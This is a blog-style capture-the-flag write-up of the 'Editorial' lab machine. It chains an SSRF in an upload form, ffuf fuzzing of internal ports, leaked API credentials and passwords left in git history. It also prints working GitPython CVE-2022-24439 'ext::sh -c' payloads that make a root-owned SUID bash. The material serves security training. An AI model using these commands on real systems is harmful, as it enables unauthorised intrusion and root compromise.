+++
date = '2026-07-30T13:28:21+02:00'
draft = false
title = 'Editorial Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`17/02/2025`**

![Editorial.png](/images/imgs_editorial/Editorial.png)

---
# Introduction

**_Editorial_** is an **Easy-level Linux** machine that highlights the risks of **Server-Side Request Forgery** (**SSRF**) and poor credential management in version control systems.

The initial foothold is gained by discovering an **SSRF** vulnerability in a book publishing upload form. By fuzzing internal ports, I discovered a hidden **API** running on port **5000**, which leaked internal communications containing valid credentials for a user.
Lateral movement is achieved by enumerating the local .git repository history, revealing hardcoded credentials for another user. Finally, Privilege Escalation leverages a vulnerable **Python** script running with **sudo** privileges. The script uses a vulnerable version of **GitPython** (**CVE-2022-24439**), which allows **arbitrary command execution** to copy and set the **SUID bit** on a **bash** binary, granting **root** access.

---
# Techniques Used

- **Parameter Tampering**

- **Server-Side Request Forgery**

- **Internal API Fuzzing**

- **Python GitPython Command Injection (CVE-2022-24439)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- editorial -T5
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV editorial -T5
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added **`editorial.htb`** to my **`/etc/hosts`** file.

## Web Enumeration

While running **Gobuster** to enumerate directories, I manually explored the website on port **80**.

```bash
gobuster dir -u http://editorial.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

![gob.png](/images/imgs_editorial/gob.png)

I found an interesting endpoint: **`/upload`**. This page contained a form to submit information about a book. Two specific inputs caught my attention: a "**Cover URL**" field and a **file upload** functionality with a "**Preview**" button.

![form.png](/images/imgs_editorial/form.png)

Seeing a form that accepts both a user-provided URL and a file upload immediately made me suspect two potential vulnerabilities:

- **Server-Side Request Forgery** (**SSRF**)

- **File Upload Vulnerability** (**RCE**)

I fired up **Burp Suite** and started intercepting the requests to see how the backend handled the **Cover URL** input.

---
# Initial Access | SSRF & API Leak

To test for **SSRF**, I set up a **Netcat** listener on my attacker machine and submitted my IP address in the **Cover URL** field.

```bash
nc -lvnp 22667
```

![ssrf_test.png](/images/imgs_editorial/ssrf_test.png)

I received a connection back! Analyzing the **HTTP** response in **Burp Suite**, the server returned a path to a placeholder image: **`/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`**.

![req_img.png](/images/imgs_editorial/req_img.png)

I sent the request to **Repeater** and changed the URL to enumerate internal ports on the localhost (**`127.0.0.1:22`**, **`127.0.0.1:1234`**, etc.). The server kept returning a **`200 OK`** response for all of them, indicating I needed a more systematic approach to find the correct internal service.

I created a wordlist of valid port numbers (**0 to 9999**):

```bash
seq 0 9999 > paylist
```

I initially tried to use **Burp Suite**'s **Intruder**, but it was incredibly slow. 

![intruder.png](/images/imgs_editorial/intruder.png)

To speed things up, I saved the raw **HTTP** request into a file named **`ssrf.req`** and switched to **ffuf**.

**Note**: _Since I never used this tool to fuzz a parameter in a request, I had to do some research and study about it._

```bash
ffuf -request ssrf.req -request-proto http -w paylist -fs 61
```

- **`-request ssrf.req`**: Tells **ffuf** to use the raw **HTTP** request saved from **Burp Suite**. I replaced the port number in the request file with the word **FUZZ** so **ffuf** knew where to inject the payloads.

- **`-request-proto http`**: Forces the tool to use the **HTTP** protocol for the request.

- **`-w paylist`**: Specifies the wordlist containing the numbers from **0 to 9999**.

- **`-fs 61`**: Filters out responses based on size. A size of 61 bytes was the default response length for closed/unresponsive ports returning the default placeholder image. By filtering it out, **ffuf** only displays hits that return a different response.

![ffuf.png](/images/imgs_editorial/ffuf.png)

The scan successfully got a hit on port **5000**.
I went back to **Burp Suite**, requested **`127.0.0.1:5000`**, and the server returned a different file path: **`static/uploads/552c2438-3b86-4c78-8a60-e5a9e9a742e2`**.

![5000.png](/images/imgs_editorial/5000.png)

I downloaded it using **curl** and piped it into **jq** for a clean **JSON** view:

```bash
curl -s http://editorial.htb/static/uploads/49c8c4dd-6821-4bf3-a409-6992e1d2a37e | jq .
```

This file leaked a bunch of internal **API endpoints**.

![apis.png](/images/imgs_editorial/apis.png)

I immediately targeted the **`authors` endpoint** via **Burp Suite**: 
- **`http://127.0.0.1:5000/api/latest/metadata/messages/authors`**.

The response contained another file path. I downloaded it and it displayed an internal welcome message with hardcoded credentials:

![pass.png](/images/imgs_editorial/pass.png)

I used these credentials to **SSH** into the machine:

```bash
ssh dev@editorial.htb
```

![userf.png](/images/imgs_editorial/userf.png)

I successfully retrieved the **user flag** from **`/home/dev/user.txt`**.

---
# Lateral Movement | Git History

Once inside, I started enumerating the file system. In the **`/apps`** directory, I found a hidden **`.git`** folder.

```bash
cd apps
ls -lha
cd .git
```

![git.png](/images/imgs_editorial/git.png)

**Note**: _**Git** repositories left on production servers are goldmines for **sensitive information**._

I checked the **commit history** using **`git log`** and reviewed the changes commit by commit using **`git show`**.

In one of the older commits, I found a hardcoded password for the **prod** user:

![pass2.png](/images/imgs_editorial/pass2.png)

I switched to the **prod** user using **`su prod`**.

---
# Privilege Escalation | CVE-2022-24439

Running **`sudo -l`** revealed that the **prod** user could execute a specific **Python** script as **root** without a password:

![sudol.png](/images/imgs_editorial/sudol.png)

I inspected the script:

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

**Note**: _The script takes a user-supplied argument (**`sys.argv[1]`**), which is expected to be a **URL**, and passes it to the **`git.Repo.clone_from`** function. The critical flaw is the inclusion of the **`multi_options=["-c protocol.ext.allow=always"]`** parameter. This specific configuration explicitly enables **Git**'s **`ext::`** transport protocol._

Researching "**python git repo exploit**", I found **CVE-2022-24439**. The **GitPython** library is vulnerable to **Command Injection** when resolving user-supplied **URLs** if the **`ext::`** protocol is allowed. An attacker can craft a malicious **URL** payload using **`ext::sh -c`** to execute arbitrary bash commands in the context of the script (in this case, as **root**).

I attempted to get a standard reverse shell, but the payload failed to execute properly. Instead, I opted for a more reliable approach: copying the **bash** binary into my current directory, changing its owner to **root**, and setting the **SUID bit**.

Since spaces in the payload could break the **Git URL** parsing, I used **`%`** as a space separator:

```bash
# 1. First payload: chown the bash binary to root
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chown% root:root% /home/prod/bash'

# 2. Second payload: Set the SUID permission
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% 4755% /home/prod/bash'
```

![privesc1.png](/images/imgs_editorial/privesc1.png)

![privesc2.png](/images/imgs_editorial/privesc2.png)
With the **SUID** binary ready, I simply executed it to spawn a **root** shell:

```bash
./bash -p
```

![rootf.png](/images/imgs_editorial/rootf.png)

I successfully retrieved the **root flag** from **`/root/root.txt`**.

---
# Final Thoughts

**_Editorial_** is an **Easy**(**-Not so Easy**) machine that perfectly highlights some of the most common and dangerous misconfigurations found in real-world web applications and deployment pipelines.

The initial foothold via **SSRF** demonstrates exactly why user-supplied URLs must be strictly sanitized and why internal **APIs** should never blindly trust internal traffic. Bypassing the frontend and fuzzing the internal network with **`ffuf`** was a great exercise in manual request manipulation.

The lateral movement phase is an easy, but realistic scenario. Leaving a **`.git`** repository in a production environment is a notorious mistake.

Finally, the Privilege Escalation phase was straightforward. It showcased that even if a custom script seems secure at first glance, the underlying libraries it relies on can introduce flaws. It highlights the critical importance of keeping dependencies up-to-date, especially for scripts running with **`sudo`** privileges.

**Sources**:

- **Server-Side Request Forgery (SSRF) | https://portswigger.net/web-security/ssrf**

- **GitPython Command Injection (CVE-2022-24439) | https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858**